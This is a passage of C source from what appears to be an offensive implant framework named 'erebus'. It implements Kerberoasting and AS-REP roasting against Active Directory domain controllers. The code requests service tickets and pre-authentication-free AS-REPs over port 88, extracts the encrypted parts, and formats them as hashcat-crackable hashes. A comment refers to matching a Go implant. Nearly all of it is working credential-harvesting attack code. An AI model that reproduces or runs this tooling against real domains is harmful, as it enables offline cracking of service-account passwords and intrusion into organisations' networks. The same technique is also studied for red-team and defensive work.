    size_t rl = strlen(realm);
    if (rl >= sizeof(realm_up)) return 0;
    for (size_t i = 0; i < rl; i++) {
        char c = realm[i];
        realm_up[i] = (c >= 'a' && c <= 'z') ? (char)(c - 32) : c;
    }
    realm_up[rl] = '\0';

    uint8_t *auth_c = NULL;
    size_t auth_clen = 0;
    if (!build_authenticator(realm_up, user, creds->session_key, creds->session_key_len,
            creds->session_etype, &auth_c, &auth_clen))
        return 0;

    uint8_t *ap_req = NULL;
    size_t ap_len = 0;
    if (!build_ap_req(creds, auth_c, auth_clen, &ap_req, &ap_len)) {
        free(auth_c);
        return 0;
    }
    free(auth_c);

    /* NT-SRV-INST (2) for service/hostname principals */
    erebus_der_buf body;
    if (!erebus_der_init(&body, 512)) { free(ap_req); return 0; }
    if (!build_kdc_req_body(&body, 12, realm_up, NULL, sname, 2, 2, 0)) {
        free(ap_req);
        erebus_der_free(&body);
        return 0;
    }

    erebus_der_buf req;
    erebus_der_init(&req, ap_len + body.len + 128);
    erebus_der_buf pv, mt;
    erebus_der_init(&pv, 8); erebus_der_put_int(&pv, 0x02, 5);
    erebus_der_init(&mt, 8); erebus_der_put_int(&mt, 0x02, 12);
    erebus_der_put_ctx_seq(&req, 1, pv.data, pv.len);
    erebus_der_put_ctx_seq(&req, 2, mt.data, mt.len);
    erebus_der_free(&pv); erebus_der_free(&mt);

    /* padata[3] = PA-TGS-REQ (type 1) containing AP-REQ */
    erebus_der_buf pa_one, pa_seq;
    erebus_der_init(&pa_one, ap_len + 32);
    put_pa_data(&pa_one, 1, ap_req, ap_len);
    free(ap_req);
    erebus_der_init(&pa_seq, pa_one.len + 16);
    erebus_der_put_seq(&pa_seq, pa_one.data, pa_one.len);
    erebus_der_put_ctx_seq(&req, 3, pa_seq.data, pa_seq.len);
    erebus_der_free(&pa_one); erebus_der_free(&pa_seq);

    erebus_der_put_ctx_seq(&req, 4, body.data, body.len);
    erebus_der_free(&body);

    erebus_der_buf app;
    erebus_der_init(&app, req.len + 16);
    erebus_der_put_app(&app, 12, req.data, req.len);
    erebus_der_free(&req);

    uint8_t *resp = NULL;
    size_t resp_len = 0;
    if (!erebus_krb_tcp_exchange(dc, 88, app.data, app.len, &resp, &resp_len)) {
        erebus_der_free(&app);
        return 0;
    }
    erebus_der_free(&app);

    int32_t err = 0;
    if (is_krb_error(resp, resp_len, &err)) {
        free(resp);
        return 0;
    }

    erebus_der_reader r;
    erebus_der_r_init(&r, resp, resp_len);
    uint8_t tag;
    const uint8_t *seq;
    size_t seq_len;
    if (!erebus_der_r_tag_len(&r, &tag, &seq, &seq_len) || (tag & 0x1F) != 13) {
        free(resp);
        return 0;
    }
    int ok = extract_ticket_blob(seq, seq_len, out_st);
    free(resp);
    return ok;
}

int erebus_krb_tgs_req(const char *dc, const char *realm, const char *spn,
    const erebus_krb_creds *creds, erebus_krb_enc_data *out_service_ticket) {
    /* Username required for Authenticator; public path unused — kerberoast uses tgs_req_with_user. */
    (void)dc; (void)realm; (void)spn; (void)creds; (void)out_service_ticket;
    return 0;
}

static char *hex_encode(const uint8_t *bin, size_t bin_len) {
    if (!bin || !bin_len) return NULL;
    char *hex = (char *)malloc(bin_len * 2 + 1);
    if (!hex) return NULL;
    static const char *H = "0123456789abcdef";
    for (size_t i = 0; i < bin_len; i++) {
        hex[i * 2] = H[(bin[i] >> 4) & 0xF];
        hex[i * 2 + 1] = H[bin[i] & 0xF];
    }
    hex[bin_len * 2] = '\0';
    return hex;
}

static void realm_upper(const char *realm, char *out, size_t out_cap) {
    size_t rl = realm ? strlen(realm) : 0;
    if (rl >= out_cap) rl = out_cap ? out_cap - 1 : 0;
    for (size_t i = 0; i < rl; i++) {
        char c = realm[i];
        out[i] = (c >= 'a' && c <= 'z') ? (char)(c - 32) : c;
    }
    if (out_cap) out[rl] = '\0';
}

int erebus_krb_format_hashcat(char *dst, size_t cap,
    int etype, const char *sam, const char *domain, const char *spn,
    const uint8_t *cipher, size_t cipher_len) {
    if (!dst || cap < 64 || !cipher || !cipher_len) return 0;
    if (!sam) sam = "";
    if (!domain) domain = "";
    if (!spn) spn = "";

    char *hex = hex_encode(cipher, cipher_len);
    if (!hex) return 0;

    int n;
    if (etype == 23) {
        /* Match Go implant: $krb5tgs$23$*sam$domain$spn*$cipherhex */
        n = snprintf(dst, cap, "$krb5tgs$23$*%s$%s$%s*$%s", sam, domain, spn, hex);
    } else if (etype == 17) {
        n = snprintf(dst, cap, "$krb5tgs$17$%s$%s$*%s*$%s", sam, domain, spn, hex);
    } else if (etype == 18) {
        n = snprintf(dst, cap, "$krb5tgs$18$%s$%s$*%s*$%s", sam, domain, spn, hex);
    } else {
        n = snprintf(dst, cap, "$krb5tgs$%d$%s$%s$%s$%s", etype, sam, domain, spn, hex);
    }
    free(hex);
    return n > 0 && (size_t)n < cap;
}

int erebus_krb_format_asrep_hashcat(char *dst, size_t cap,
    int etype, const char *user, const char *domain,
    const uint8_t *cipher, size_t cipher_len) {
    if (!dst || cap < 64 || !cipher || !cipher_len || !user || !user[0]) return 0;
    if (!domain) domain = "";

    char realm[256];
    realm_upper(domain, realm, sizeof(realm));

    /* RC4 (hashcat 18200): $krb5asrep$23$user@REALM:cipherhex */
    if (etype == EREBUS_KRB_ETYPE_RC4) {
        char *hex = hex_encode(cipher, cipher_len);
        if (!hex) return 0;
        int n = snprintf(dst, cap, "$krb5asrep$23$%s@%s:%s", user, realm, hex);
        free(hex);
        return n > 0 && (size_t)n < cap;
    }

    /*
     * AES (hashcat 19600/19700): $krb5asrep$17|18$user@REALM:checksum$edata
     * checksum = first 12 bytes of enc-part, edata = remainder.
     */
    if (etype == EREBUS_KRB_ETYPE_AES128 || etype == EREBUS_KRB_ETYPE_AES256) {
        if (cipher_len < 13) return 0;
        char *chk = hex_encode(cipher, 12);
        char *edata = hex_encode(cipher + 12, cipher_len - 12);
        if (!chk || !edata) {
            free(chk);
            free(edata);
            return 0;
        }
        int n = snprintf(dst, cap, "$krb5asrep$%d$%s@%s:%s$%s", etype, user, realm, chk, edata);
        free(chk);
        free(edata);
        return n > 0 && (size_t)n < cap;
    }

    char *hex = hex_encode(cipher, cipher_len);
    if (!hex) return 0;
    int n = snprintf(dst, cap, "$krb5asrep$%d$%s@%s:%s", etype, user, realm, hex);
    free(hex);
    return n > 0 && (size_t)n < cap;
}

/* Extract etype+cipher from AS-REP without decrypting (for AS-REP roast). */
static int parse_as_rep_enc_part(const uint8_t *msg, size_t msg_len,
    int32_t *etype, uint8_t **cipher, size_t *clen) {
    erebus_der_reader r;
    erebus_der_r_init(&r, msg, msg_len);
    uint8_t tag;
    const uint8_t *seq;
    size_t seq_len;
    if (!erebus_der_r_tag_len(&r, &tag, &seq, &seq_len)) return 0;
    if ((tag & 0x1F) != 11) return 0; /* APPLICATION 11 = AS-REP */

    const uint8_t *ep;
    size_t eplen;
    uint8_t etag;
    if (!erebus_der_r_find_ctx(seq, seq_len, 6, &etag, &ep, &eplen)) return 0;
    return parse_encrypted_data(ep, eplen, etype, cipher, clen);
}

static int asrep_one_user(const char *dc, const char *domain, const char *user,
    erebus_krb_hash *out) {
    memset(out, 0, sizeof(*out));
    if (!user || !user[0]) return 0;

    uint8_t *req = NULL;
    size_t req_len = 0;
    /* AS-REQ with no PA-DATA — KDC returns AS-REP if DONT_REQ_PREAUTH. */
    if (!build_as_req(domain, user, NULL, 0, &req, &req_len)) return 0;

    uint8_t *resp = NULL;
    size_t resp_len = 0;
    if (!erebus_krb_tcp_exchange(dc, 88, req, req_len, &resp, &resp_len)) {
        free(req);
        return 0;
    }
    free(req);

    int32_t err = 0;
    if (is_krb_error(resp, resp_len, &err)) {
        free(resp);
        /* 25 = KDC_ERR_PREAUTH_REQUIRED — account requires pre-auth, not roastable */
        return 0;
    }

    int32_t etype = 0;
    uint8_t *cipher = NULL;
    size_t clen = 0;
    if (!parse_as_rep_enc_part(resp, resp_len, &etype, &cipher, &clen)) {
        free(resp);
        return 0;
    }
    free(resp);

    strncpy(out->sam, user, sizeof(out->sam) - 1);
    snprintf(out->enc, sizeof(out->enc), "etype%d", etype);
    int ok = erebus_krb_format_asrep_hashcat(out->hash, sizeof(out->hash),
        etype, user, domain, cipher, clen);
    free(cipher);
    return ok;
}

int erebus_krb_asreproast(
    const char *dc_host,
    const char *domain,
    const char **users,
    size_t user_count,
    erebus_krb_hash *out,
    size_t max_out,
    size_t *out_count) {
    if (out_count) *out_count = 0;
    if (!dc_host || !domain || !out || !max_out) return 0;
    if (!users || user_count == 0) return 1;

    size_t n = 0;
    for (size_t i = 0; i < user_count && n < max_out; i++) {
        if (!users[i] || !users[i][0]) continue;
        if (asrep_one_user(dc_host, domain, users[i], &out[n])) n++;
    }
    if (out_count) *out_count = n;
    return 1;
}

int erebus_krb_kerberoast(
    const char *dc_host,
    const char *domain,
    const char *username,
    const char *password,
    const char **spns,
    const char **sams,
    size_t spn_count,
    erebus_krb_hash *out,
    size_t max_out,
    size_t *out_count) {
    if (out_count) *out_count = 0;
    if (!dc_host || !domain || !username || !password || !out || !max_out) return 0;
    if (!spns || spn_count == 0) return 1; /* success, zero hashes */

    erebus_krb_creds creds;
    if (!erebus_krb_as_req(dc_host, domain, username, password, &creds)) return 0;

    size_t n = 0;
    for (size_t i = 0; i < spn_count && n < max_out; i++) {
        if (!spns[i] || !spns[i][0]) continue;
        erebus_krb_enc_data st;
        if (!tgs_req_with_user(dc_host, domain, username, spns[i], &creds, &st)) continue;

        erebus_krb_hash *h = &out[n];
        memset(h, 0, sizeof(*h));
        strncpy(h->spn, spns[i], sizeof(h->spn) - 1);
        if (sams && sams[i]) strncpy(h->sam, sams[i], sizeof(h->sam) - 1);
        snprintf(h->enc, sizeof(h->enc), "etype%d", st.etype);
        if (!erebus_krb_format_hashcat(h->hash, sizeof(h->hash), st.etype,
                h->sam, domain, h->spn, st.cipher, st.cipher_len)) {
            erebus_krb_enc_data_free(&st);
            continue;
        }
        erebus_krb_enc_data_free(&st);
        n++;
    }
    erebus_krb_creds_free(&creds);
    if (out_count) *out_count = n;
    return 1;
}
